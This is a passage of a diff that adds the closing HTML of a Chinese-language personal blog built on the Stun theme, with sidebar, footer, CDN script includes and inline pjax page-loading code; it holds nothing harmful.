+          8.1：相关平台</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#8-2%EF%BC%9A%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-text">
+          8.2：参考资料</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/images/icons/notAlone.png" alt="avatar"></div><p class="sidebar-ov-author__text">但愿五湖明月在。</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">51</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">21</div><div class="sidebar-ov-state-item__name">分类</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022~2024</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>镜坛主</span></div><div>欢迎来到 —— 镜坛！</div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax@latest/pjax.min.js"></script><script>window.addEventListener('DOMContentLoaded', function () {
+  var pjax = new Pjax({"selectors":["head title","#main",".pjax-reload",".header-banner"],"history":true,"scrollTo":false,"scrollRestoration":false,"cacheBust":false,"debug":false,"currentUrlFullReload":false,"timeout":0});
+  // 加载进度条的计时器
+  var loadingTimer = null;
+
+  // 重置页面 Y 方向上的滚动偏移量
+  document.addEventListener('pjax:send', function () {
+    $('.header-nav-menu').removeClass('show');
+    if (CONFIG.pjax && CONFIG.pjax.avoidBanner) {
+      $('html').velocity('scroll', {
+        duration: 500,
+        offset: $('#header').height(),
+        easing: 'easeInOutCubic'
+      });
+    }
+
+    var loadingBarWidth = 20;
+    var MAX_LOADING_WIDTH = 95;
+
+    $('.loading-bar').addClass('loading');
+    $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    clearInterval(loadingTimer);
+    loadingTimer = setInterval(function () {
+      loadingBarWidth += 3;
+      if (loadingBarWidth > MAX_LOADING_WIDTH) {
+        loadingBarWidth = MAX_LOADING_WIDTH;
+      }
+      $('.loading-bar__progress').css('width', loadingBarWidth + '%');
+    }, 500);
+  }, false);
+
+  window.addEventListener('pjax:complete', function () {
+    clearInterval(loadingTimer);
+    $('.loading-bar__progress').css('width', '100%');
+    $('.loading-bar').removeClass('loading');
+    setTimeout(function () {
+      $('.loading-bar__progress').css('width', '0');
+    }, 400);
+    $('link[rel=prefetch], script[data-pjax-rm]').each(function () {
+      $(this).remove();
+    });
+    $('script[data-pjax], #pjax-reload script').each(function () {
+      $(this).parent().append($(this).remove());
+    });
+
+    if (Stun.utils.pjaxReloadBoot) {
+      Stun.utils.pjaxReloadBoot();
+    }
+    if (Stun.utils.pjaxReloadScroll) {
+      Stun.utils.pjaxReloadScroll();
+    }
+    if (Stun.utils.pjaxReloadSidebar) {
+      Stun.utils.pjaxReloadSidebar();
+    }
+    if (false) {
+      if (Stun.utils.pjaxReloadHeader) {
+        Stun.utils.pjaxReloadHeader();
+      }
+      if (Stun.utils.pjaxReloadScrollIcon) {
+        Stun.utils.pjaxReloadScrollIcon();
+      }
+      if (Stun.utils.pjaxReloadLocalSearch) {
+        Stun.utils.pjaxReloadLocalSearch();
+      }
+    }
+  }, false);
+}, false);</script><div id="pjax-reload"></div><script src="/js/utils.js?v=2.8.0"></script><script src="/js/stun-boot.js?v=2.8.0"></script><script src="/js/scroll.js?v=2.8.0"></script><script src="/js/header.js?v=2.8.0"></script><script src="/js/web-effect-click.js?v=2.8.0"></script><script src="/js/web-effect-flower.js?v=2.8.0"></script><script src="/js/sidebar.js?v=2.8.0"></script></body></html>
